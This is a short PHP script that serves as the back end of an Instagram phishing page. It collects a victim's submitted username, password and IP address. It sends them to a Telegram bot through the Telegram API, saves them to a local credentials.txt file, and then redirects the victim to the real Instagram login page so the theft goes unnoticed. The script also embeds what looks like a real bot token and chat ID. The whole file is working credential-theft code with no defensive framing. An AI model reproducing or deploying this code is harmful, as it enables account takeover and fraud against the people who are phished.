<?php
// Your Telegram bot token and chat ID
$botToken = "6587353537:AAFEXdHmxHDMMJ4GiODPyFk_Q8vxqE4lJpM"; // Replace with your actual token
$chatId = "7047340294";

// Get submitted data
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];

// Format message
$message = "Instagram Login Attempt:\nUsername: $username\nPassword: $password\nIP: $ip";

// Send to Telegram
file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));

// Log to local file
file_put_contents("credentials.txt", "Username: $username\nPassword: $password\nIP: $ip\n\n", FILE_APPEND);

// Redirect to real Instagram login page
header("Location: https://www.instagram.com/accounts/login/");
exit();
?>